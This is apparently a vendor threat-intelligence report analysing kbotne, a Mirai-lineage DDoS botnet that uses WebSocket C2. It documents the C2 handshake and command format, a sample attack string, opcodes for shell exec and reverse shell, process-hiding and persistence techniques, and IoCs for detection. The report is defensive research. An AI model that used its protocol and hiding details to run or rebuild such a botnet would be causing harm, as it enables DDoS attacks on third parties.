# kbotne: Mirai learns WebSocket, naturally calls it `/connectlol`

**Nokia Deepfield Emergency Response Team (ERT)**

**First published: 2026-06-04**

> **Content warning:** This report quotes malware artifacts verbatim, including process names, operator tags, and embedded strings chosen by the threat actor. Some contain crude language. These are reproduced exactly as found in samples to enable accurate detection.

---

## Summary

kbotne is a Mirai-lineage DDoS botnet with one unusually careful design choice and a number of other choices that are, charitably, easier to explain than to defend. The careful choice is WebSocket: the C2 channel runs over a standard HTTP-upgraded WebSocket connection (`Upgrade: websocket`, `Sec-WebSocket-Version: 13`, random key, client masking, the RFC 6455 machinery) on port 80. In our collection, kbotne is the only Mirai-lineage family that moves its command channel over a real WebSocket session instead of a raw TCP protocol. The other choices include hex-encoded debug/config strings, a broken Android APK that fails to install because the ZIP archive is truncated, and a process killer whose binary-scoring path mostly recognizes kbotne-shaped binaries.

The bot was first observed in April 2026, delivered via netcat push-on-connect from `185.231.155[.]250`. Full Ghidra decompilation of unpacked builds (`f342c992` and `1f9b6084`) shows a 10-method dispatcher spanning raw TCP, UDP, GRE, HTTP, and HTTPS floods.

Build provenance matters for this family. The earlier packed/source-lineage build carries the tag `ilovecatgirlsowouwugaysex1111`, writes a systemd unit with `Description=very good, fr best`, and includes the banner `infected by kbotne`. The June rebuild keeps the WebSocket C2 and `real.botnet.st`, but shifts toward Android-style install paths and drops many of the older Linux persistence strings. The C2 path remains `/connectlol`, which is useful for detection and not obviously optimized for discretion.

## Key findings

- **WebSocket C2 on port 80.** The only Mirai-lineage bot in our tracking that uses a standard WebSocket upgrade for its command channel. The C2 runs at `real.botnet[.]st/connectlol` with `Sec-WebSocket-Version: 13` and a randomly generated `Sec-WebSocket-Key`. This is architecturally unusual for IoT malware and makes C2 traffic harder to distinguish from legitimate web traffic at the network layer than the raw TCP protocols used by every other Mirai fork we monitor.
- **Hex-encoding, but not everywhere.** Earlier samples store important strings as ASCII hex pairs (`72656c656173652076657273696f6e2073746172746564` -> `release version started`). The June rebuild still contains hex-encoded function/debug tags, but stores `real.botnet.st` as plaintext. This is not encryption in any meaningful sense. It is `strings(1)` avoidance, and only just.
- **10 attack methods.** Full decompilation of unpacked builds shows TCP SYN, TCP ACK, UDP generic, UDP plain, TCP stomp, HTTP GET, HTTP POST, GRE flood, TCP RST, and HTTPS flood. The complete table is in [Attack methods](#attack-methods).
- **A kbotne-shaped killer.** The killer thread scores `/proc/*/exe` binaries by scanning for kbotne's own hex-encoded tags (`attack_udp_plain`, `killer_kill`, `resolve_cnc_addr`, etc.). If a binary contains more than one matching tag, it gets `SIGKILL`. That makes the binary-scoring path useful against other kbotne copies or close forks, but much less useful against an unrelated Mirai fork that did not accidentally ship kbotne's symbol-adjacent souvenirs.
- **Source leak treated as context, not primary evidence.** A source archive or close reconstruction was observed circulating on Telegram in May 2026, but the claims in this report are grounded in the binaries, Ghidra output, monitors, and IoCs released with this research. Where source-leak context and binary evidence disagree, the binary wins.

## Timeline

| Date | Event |
|---|---|
| 2026-04-09 | First observed; UPX-packed ELF delivered from `185.231.155[.]250:1`; broken APK on `:80` |
| 2026-05-08 | Unpacked WebSocket Mirai/kbotne-family build (`f342c992`) observed from `185.231.155[.]250:2`; full decompilation shows 10 attack handlers |
| 2026-05 | Source code or reconstruction observed circulating on Telegram; used as corroborating context only |
| 2026-06-01 | Unpacked rebuild (`1f9b6084`) served from `185.231.155[.]250:2`; 10 attack methods and HTTP update poller |

## Samples

| Hash (prefix) | Size | Packed | Port | Notes |
|---|---|---|---|---|
| `69bd7a47` | 49,404 | UPX | :1 | Original packed build; WebSocket C2 and operator tag |
| `f342c992` | 116,496 | No | :2 | May unpacked build; 10 attack methods in Ghidra dispatcher |
| `091e48cd` | 622,640 | N/A | :80 | Android APK (`com.kbotne.reboot`); truncated ZIP, does not install |
| `1f9b6084` | 118,204 | No | :2 | June rebuild; 10 attack methods; HTTP update poller; full Ghidra decompilation |

All served from `185.231.155[.]250`. Full hashes in [`iocs/hashes.csv`](iocs/hashes.csv).

## C2 architecture

### WebSocket protocol

The C2 connection follows a standard HTTP WebSocket upgrade on port 80:

```
GET /connectlol HTTP/1.1
Host: real.botnet.st
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <16 random bytes, base64>
Sec-WebSocket-Version: 13
```

After upgrade, all communication uses RFC 6455 framing with the client mask bit set. The command channel is text frames (opcode `0x81`).

This is more than a banner wrapped around a socket. The WebSocket layer implements the standard upgrade, client masking, text frames, and close/control handling well enough to look like a long-lived WebSocket session to a web server on port 80. The path `/connectlol` is the part you would notice, and it is the part a WAF rule can catch.

The masking is the part worth dwelling on. RFC 6455 mandates client-to-server masking for one reason: to stop malicious browser JavaScript from poisoning intermediary caches. That threat model needs a browser, a proxy, and a victim, none of which are in the room when a bot talks to its own C2. kbotne masks every frame correctly anyway, defending against an attack that cannot be mounted against it.

### Registration

On connect, the bot sends a single WebSocket text frame:

```
<name>;<raw_socket>;<cpu_count>;<ram_mb>;2
```

Semicolon-delimited, no encryption, no magic bytes. The `name` field is the bot identifier (from argv or `unknown`). `raw_socket` is `1` if `socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)` succeeds (a root/capability check), `0` otherwise. The final field is the constant `2` in the June rebuild, with no additional structure visible in the samples we reviewed.

### Command dispatch

Commands arrive as WebSocket text frames. The first byte selects the handler:

| Byte | Action | Notes |
|---|---|---|
| `0x01` | Self-destruct | Kill all children, SIGKILL self |
| `0x02` | Stop attacks | Kill attack PIDs only |
| `0x03` | Shell exec | `sh -c <payload>` |
| `0x04` | Reverse shell | Connect-back to `<host>:<port>` from payload |
| `0x05` | Update C2 | Replaces the C2 domain pointer in memory; no restart |
| else | Attack | Parsed as `<id>;<target>;<duration>|<options>` (see below) |

Opcode `0x05` is notable: the C2 can push a new domain to the bot without restarting it or patching the binary. Combined with the `GET /check` update poller (see below), the operator has two mechanisms for live infrastructure rotation.

### DNS resolution

Custom resolver sending raw UDP to `8.8.8.8:53`, bypassing the system resolver. No obfuscation, no byte-swap, no ENS, no DoH. The domain `real.botnet[.]st` resolves to an IP and the bot connects to it. There are more elaborate ways to do this; kbotne does not use them. At publication review time, public DNS resolved `real.botnet[.]st` to `81.28.12[.]12`, a G-Core Labs CDN edge (AS199524); because this is domain-based C2, the durable indicator is the domain and path, not a single A record.

### Live C2 observation

Our C2 monitor connected to `real.botnet[.]st/connectlol` as a registered bot and logged the commands it received. Between 2026-06-01 and 2026-06-02 the C2 issued 1,186 attack commands over roughly 13 hours against 39 distinct targets: short 30-second bursts, dominated by `tcp_syn` (id 1) and `gre_flood` (id 8), with `tcp_stomp` (id 5), `tcp_ack` (id 2), and `https_flood` (id 10) also in rotation. Of the five, `https_flood` was the least used, at 34 commands. It is also the only method that pays for a full TLS handshake before it can flood anything, which is about what its cost/benefit earns it. Destination ports clustered on `443`, `80`, and `22`, with a tail of game-server ports such as `28015` and `30120`. The targets were ordinary web, SSH, and game-hosting hosts rather than anything bespoke, and we do not publish the victim addresses here.

The channel has been quiet since. `real.botnet[.]st` now resolves to the G-Core CDN edge noted above, and the origin behind it answers the WebSocket upgrade with `502 Bad Gateway`: the front end is reachable, but the C2 application behind it is not currently serving bots. That is consistent with either an outage or an infrastructure migration.

## Attack methods

The unpacked May and June 2026 builds dispatch 10 attack types, each forked into a child process:

| ID | Name | Protocol | Notes |
|----|------|----------|-------|
| 1 | `tcp_syn` | TCP RAW | SYN flood; IP_HDRINCL, spoofed source |
| 2 | `tcp_ack` | TCP RAW | ACK flood |
| 3 | `udp_generic` | UDP RAW | Configurable payload, spoofed source |
| 4 | `udp_plain` | UDP DGRAM | Standard socket, no raw IP |
| 5 | `tcp_stomp` | TCP STREAM | Connect + ACK+PSH data push |
| 6 | `http_get` | TCP STREAM | GET flood with randomized UA, cookie, path |
| 7 | `http_post` | TCP STREAM | POST flood with randomized body |
| 8 | `gre_flood` | RAW (proto 47) | GRE-encapsulated IP packets |
| 9 | `tcp_rst` | TCP RAW | RST flood |
| 10 | `https_flood` | TCP+TLS | TLS handshake + HTTP flood |

Attack commands use a text header followed by text-encoded key-value options:

```
6;198.51.100.10;60|int;0;80&int;3;1400&string;15;example.com&string;16;/api/endpoint
```

The header is `<method_id>;<target>;<duration_seconds>`. Options are separated by `&`, each formatted `<type>;<id>;<value>`. Option types are `string` (0), `int` (1), `bool` (2), and `hex` (3). The option IDs map to standard Mirai-style parameters: `0` = dst_port, `1` = src_port, `3` = payload_size, `11` = connection_count, `14` = hex_payload, `15` = http_host, `16` = http_path.

The method table is not inferred from names in `.rodata`; it comes from the dispatcher. That matters here because this family leaves some useful strings lying around, but not enough to make string extraction a substitute for decompilation. The code gets the final vote.

## String obfuscation

The early/source-lineage config system stores sensitive strings as hex-encoded ASCII in a flat blob divided into 512-byte slots:

```c
config_set_slot(0,    "release version started");   // 72656c656173652076657273696f6e2073746172746564
config_set_slot(5120, "real.botnet.st");             // 7265616c2e626f746e65742e7374
```

At runtime, `config_lookup("DOMAIN")` maps the key to a slot offset, reads hex pairs, and decodes with `sscanf(hex, "%2hhx", &byte)`. No key, no state, no block cipher. The hex encoding is the obfuscation. It survives `strings(1)` because the hex blob is not ASCII text, but it does not survive `xxd -r` or anyone who looks at the binary for five minutes.

The earlier/source-lineage slot layout:

| Slot offset | Key | Content |
|---|---|---|
| 0 | `MESSAGE` | `release version started` |
| 512 | `CPU` | `/proc/cpuinfo` |
| 1024 | `RAM` | `/proc/meminfo` |
| 1536 | `LIBC1` | `/usr/lib/kbotne.so` |
| 2048 | `LIBC2` | `/usr/local/lib/kbotne.so` |
| 2560 | `LIBC3` | `/lib/kbotne.so` |
| 3072 | `LIBC_PATHS` | All three lib paths, newline-separated |
| 3584 | `INSTALL_FULL_PATH` | `/.kbotne/kbotne` |
| 4096 | `MOTD` | `/etc/motd` |
| 4608 | `INFECTED` | `infected by kbotne` |
| 5120 | `DOMAIN` | `real.botnet.st` |

Slot keys `MESdfhdSAGE1` through `MESdfhdSAGE4` reserve four additional 512-byte slots whose purpose is not evident from either the source context or the early binary artifacts. The names look like `MESSAGE1` passed through a very small incident response event.

The June rebuild is different. It still carries hex-encoded function/debug tags, but `real.botnet.st`, `/connectlol`, `/data/local/tmp/sdk`, and the update-poller strings are plaintext in `.rodata`. This is why we treat hex encoding as a family trait with build-specific coverage, not as a guarantee that every interesting string is hidden. The implementation is consistent only at the level of intent: make casual string extraction less useful.

## Process management

kbotne's self-preservation is well-matched to the Android TV boxes it targets, but most of it points inward. The disguise names blend into an Android set-top process list, the `/proc` hiding uses an Android path that exists on the target, and the persistence loop writes to the same directory the update poller stages to. The killer, meanwhile, only recognizes other copies of kbotne. The result is a coherent, closed system: good at surviving on its intended platform, and almost entirely concerned with itself. Behavior is build-dependent; we flag the build where it changes what happens.

### Disguise

The bot picks hardcoded process names at random and applies them via `prctl(PR_SET_NAME)` and `argv[0]` overwrite.

The earlier/source-lineage names are chosen for the platform:

```
systemd-thread, system-updater, bluetooth, androidsystem,
tv-box-software, adbservice, screen-mirror, netflix
```

On an Android TV box, most of these are plausible residents of a process list. The choice of `netflix` for a statically linked ARM binary is optimistic, but on a device whose main job is streaming video, it is at least in the right genre. The June rebuild shifts toward generic Linux names (`telnetd`, `system`, `kernel`, `sftpservice`, `watchdog`, `linux`, `systemd`), which blend in less specifically but survive on either platform.

### /proc bind mount

Source-lineage persistence code hides its `/proc/<pid>` entry by bind-mounting `/data/local` over it:

```c
mount("/data/local", "/proc/<pid>", NULL, MS_BIND, NULL);
```

On Android, where `/data/local` exists, this works: the process disappears from `ls /proc/` and from `ps`, which reads `/proc`. It does not work against `kill` (which uses PIDs directly) or kernel-level monitoring, and on a non-Android Linux device the mount silently fails because the source path does not exist. Since kbotne is delivered via ADB to Android devices, the hide lands where it needs to.

### Killer

The killer thread forks, then loops over `/proc/*/exe` binaries and scores each executable against kbotne's own hex-encoded tags:

```
attack_udp_plain, attack_udp_generic, attack_tcp_syn, attack_tcp_ack,
ensure_single_instance, killer_kill, locker_create, killer_create,
locker_init, killer_init, resolve_cnc_addr, resolve_domain_to_hostname,
resolve_entries_free
```

If a binary contains more than one match, the process is killed. These are kbotne's own artifacts: its function tags, resolver names, locker/killer names, and in earlier builds the bot tag itself. A standard Mirai fork running on the same device is unlikely to contain `6b696c6c65725f696e6974` (`killer_init`) in `.rodata`. That is a fairly specific admission ticket, and it makes this an anti-self-reinfection mechanism more than a general competitor killer. The June rebuild also contains a coarser cleanup pass around process paths, but the main, well-supported finding is narrower: the scoring logic recognizes kbotne-shaped binaries, not the usual Mirai zoo.

### Persistence

The earlier packed build carries Linux persistence strings (systemd, init.d, crontab, rc.local, `/.kbotne/kbotne`, the `kbotne.so` library paths) inherited from its Mirai lineage. The June rebuild drops most of these and writes to `/data/local/tmp`, `/root`, `/home`, and `/var/local` instead, with the update path at `/data/local/tmp/sdk`. That last detail matters: it is the same path the update poller (below) stages new binaries to, so persistence and remote update share a single directory. The cleanup logic in the persistence loop targets entries named `.`, `..`, and `sdk`. Two of those are not files you can delete; the third is exactly the filename the bot installs as.

### OOM protection

The earlier build writes `-1000` to `/proc/self/oom_score_adj` and silences `oom_dump_tasks`. It is the one defense that assumes nothing about the platform and works the same wherever the binary runs.

## Update poller

The June rebuild adds a C2-initiated update mechanism (not present in the May Telegram source/reconstruction context we reviewed). The poller forks a child process that loops with random 0-29 second jitter:

1. Connect to C2 domain on port 80 via plain HTTP
2. Send `GET /check HTTP/1.1\r\nhost: <domain>\r\n\r\n`
3. If response contains `"false"` -> exec `/data/local/tmp/sdk persistence`

When the operator stages a new binary at `/data/local/tmp/sdk` and the `/check` endpoint returns a body containing `false`, the bot executes it. The jitter prevents a thundering herd. The boolean is not intuitive: in this build, `false` means "run the updater," which is the sort of interface contract you get when the only client is your own malware.

## The broken APK

The Android APK (`com.kbotne.reboot`, SHA-256 `091e48cd...`) served from `185.231.155[.]250:80` is a 622 KB ZIP archive that is missing its End of Central Directory record. Android's package manager rejects it on install. The DexProtector-encrypted 2.9 MB DEX inside is never reached. Whether the APK was always broken or became broken during upload is unknowable from the artifact alone, but leaving an uninstallable APK publicly served for weeks is not a strong signal of a well-tested delivery path. The ELF delivery via netcat on port 1 (and later port 2) works.

Malformed APKs can be intentional. Tools such as Cleafy's [MalFixer](https://github.com/Cleafy/Malfixer) exist because Android malware sometimes corrupts ZIP metadata, manifests, or assets to slow static analysis while leaving enough structure for recovery. This sample does not look like that pattern. The archive is truncated at the container level, Android rejects it before the manifest or DEX becomes operationally relevant, and the same staging host has a working ELF delivery path. A deliberately hostile APK format is a thing; this one looks more like packaging debt with a file extension.

## Operator artifacts

**The bot tag.** `ilovecatgirlsowouwugaysex1111`. This appears in the earlier packed/source-lineage artifacts and remains the single most distinctive human-chosen string in the family. It is not present in every rebuild. Detection engineers lose a convenient string; copy editors lose an unpleasant footnote.

**The systemd unit.** `Description=very good, fr best`. This is the service description written to `/etc/systemd/system/kbotne.service`. As technical self-assessments go, it is concise.

**The banner.** `infected by kbotne`. Hex-encoded at slot offset 4608, written to `/etc/motd` on infected devices. The banner announces the infection to anyone who logs in, which is either a taunt or an oversight.

**The garbled config keys.** `MESdfhdSAGE1` through `MESdfhdSAGE4` - four config slot keys that look like `MESSAGE1` after a keyboard lost an argument. The slots are allocated but do not appear to carry operational data in the artifacts we reviewed. They survive as dead allocation carried forward.

**The C2 path.** `/connectlol`. The protocol is WebSocket. The path is peer review.

## Relationship to other families

**No confirmed relationship to any family we track.** We found no shared cryptographic material, no shared C2 infrastructure, and no meaningful code overlap with Potassium, Medusa, Flylegit, Vibenet, Jackskid, CECbot, or other Mirai forks in our collection. The WebSocket C2 layer is unique in our collection. The hex-tag/config habit is distinctive. The killer's kbotne-shaped scoring logic is not something we see in the usual Mirai forks.

**Source-leak context is consistent with independent development.** The source archive or reconstruction observed on Telegram is organized around purpose-named C files (`attack_syn.c`, `attack_http.c`, `websocket.c`, `killer.c`, `config.c`) and is consistent with a developer who learned from Mirai source but wrote substantial new plumbing. We do not rely on that archive as the sole basis for any technical claim here. The WebSocket layer in particular is backed by the binaries themselves, and Mirai has no native WebSocket support.

## Detection

### Network indicators

- WebSocket upgrade to path `/connectlol` on port 80
- `Host: real.botnet.st` in the upgrade request
- Long-lived WebSocket session with text frames containing semicolon-delimited registration (`<name>;<0|1>;<cpus>;<ram>;2`) and attack commands formatted as `<id>;<target>;<duration>|<options>`
- DNS queries for `real.botnet[.]st` to `8.8.8.8:53` (custom resolver, bypasses system DNS)
- HTTP `GET /check` polling to C2 domain on port 80 (update poller, random 0-29s interval)
- Current observed A record for `real.botnet[.]st`: `81.28.12[.]12`, a G-Core Labs CDN edge (AS199524) whose origin returned `502 Bad Gateway` at publication; treat as rotatable

### Host indicators

- Earlier/source-lineage process names: `systemd-thread`, `system-updater`, `bluetooth`, `androidsystem`, `tv-box-software`, `adbservice`, `screen-mirror`, `netflix`
- June rebuild process names include: `telnetd`, `system`, `kernel`, `sftpservice`, `watchdog`, `linux`, `systemd`
- Earlier Linux install path: `/.kbotne/kbotne`
- June/update path: `/data/local/tmp/sdk`
- Earlier lib paths: `/usr/lib/kbotne.so`, `/usr/local/lib/kbotne.so`, `/lib/kbotne.so`
- systemd unit: `/etc/systemd/system/kbotne.service` with `Description=very good, fr best` (earlier/source-lineage)
- init.d script: `/etc/init.d/kbotne` (earlier/source-lineage)
- crontab entry: `@reboot /.kbotne/kbotne` (earlier/source-lineage)
- `/etc/motd` overwritten with `infected by kbotne` (earlier/source-lineage)
- Bind mount hiding: `/data/local` mounted over `/proc/<pid>` (source-lineage Android behavior; not confirmed for every build)

## Indicators of compromise

Machine-readable IoC files are in [`iocs/`](iocs/):

| File | Contents |
|------|----------|
| [`domains.csv`](iocs/domains.csv) | C2 domain |
| [`ips.csv`](iocs/ips.csv) | Delivery and C2 IPs |
| [`hashes.csv`](iocs/hashes.csv) | Sample SHA-256 hashes |
